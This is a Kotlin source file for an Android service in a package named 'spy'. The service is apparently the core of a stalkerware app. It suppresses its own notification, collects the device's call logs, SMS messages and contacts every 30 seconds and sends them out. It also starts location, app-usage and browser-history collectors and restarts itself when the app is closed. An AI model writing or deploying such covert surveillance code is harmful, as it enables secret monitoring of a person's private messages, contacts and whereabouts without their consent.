package com.gauravhanna.spy

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

class BackgroundService : Service() {

    companion object {
        private const val TAG = "BackgroundService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "spy_channel"

        private var isServiceRunning = false
        private var isCollectingData = false

        fun isNotRunning(): Boolean = !isServiceRunning

        fun stopService() {
            isServiceRunning = false
        }
    }

    private lateinit var dataCollectionThread: Thread

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ Service Created")
        isServiceRunning = true
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "✅ Service Started")

        // Start as foreground service with hidden notification
        startForeground(NOTIFICATION_ID, createHiddenNotification())

        // Start data collection
        startDataCollection()

        // Start all other services
        startOtherServices()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "Service Destroyed")
        isServiceRunning = false
        isCollectingData = false
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_MIN  // Minimum importance - no sound, no popup
            ).apply {
                description = "Background service for data collection"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    // ✅ Hidden notification - no text, no visibility
    private fun createHiddenNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")  // Empty title
            .setContentText("")   // Empty text
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startDataCollection() {
        dataCollectionThread = Thread {
            while (isServiceRunning) {
                try {
                    if (!isCollectingData) {
                        isCollectingData = true
                        collectAndSendData()
                        isCollectingData = false
                    }

                    // Wait 30 seconds before next collection
                    Thread.sleep(30000)

                } catch (e: InterruptedException) {
                    Log.d(TAG, "Data collection thread interrupted")
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Error in data collection: ${e.message}")
                    isCollectingData = false
                }
            }
        }
        dataCollectionThread.start()
    }

    private fun collectAndSendData() {
        try {
            // Get device ID
            val prefs = getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            val deviceId = prefs.getString("device_id", null)

            if (deviceId == null) {
                Log.d(TAG, "Device not registered yet - waiting for registration")
                return
            }

            Log.d(TAG, "📊 Collecting data for device: $deviceId")

            // 1. Collect and send Call Logs
            try {
                val calls = DataCollector.getCallLogs(applicationContext)
                if (calls.isNotEmpty()) {
                    NetworkHelper.sendCalls(applicationContext, calls)
                    Log.d(TAG, "✅ Sent ${calls.size} calls")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to collect/send calls: ${e.message}")
            }

            // 2. Collect and send SMS
            try {
                val sms = DataCollector.getSmsLogs(applicationContext)
                if (sms.isNotEmpty()) {
                    NetworkHelper.sendSMS(applicationContext, sms)
                    Log.d(TAG, "✅ Sent ${sms.size} SMS")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to collect/send SMS: ${e.message}")
            }

            // 3. Collect and send Contacts
            try {
                val contacts = DataCollector.getContacts(applicationContext)
                if (contacts.isNotEmpty()) {
                    NetworkHelper.sendContacts(applicationContext, contacts)
                    Log.d(TAG, "✅ Sent ${contacts.size} contacts")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to collect/send contacts: ${e.message}")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error in collectAndSendData: ${e.message}")
        }
    }

    private fun startOtherServices() {
        // Start Location Service
        try {
            val locationIntent = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(locationIntent)
            } else {
                startService(locationIntent)
            }
            Log.d(TAG, "✅ LocationService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start LocationService: ${e.message}")
        }

        // Start App Usage Collector
        try {
            AppUsageCollector.start(this)
            Log.d(TAG, "✅ AppUsageCollector started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start AppUsageCollector: ${e.message}")
        }

        // Start Browser History Helper
        try {
            BrowserHistoryHelper.start(this)
            Log.d(TAG, "✅ BrowserHistoryHelper started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start BrowserHistoryHelper: ${e.message}")
        }

        // Start DataCollector periodic sync
        try {
            DataCollector.start(this)
            Log.d(TAG, "✅ DataCollector started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start DataCollector: ${e.message}")
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed - restarting service")

        // Restart service if task is removed
        val restartIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }
}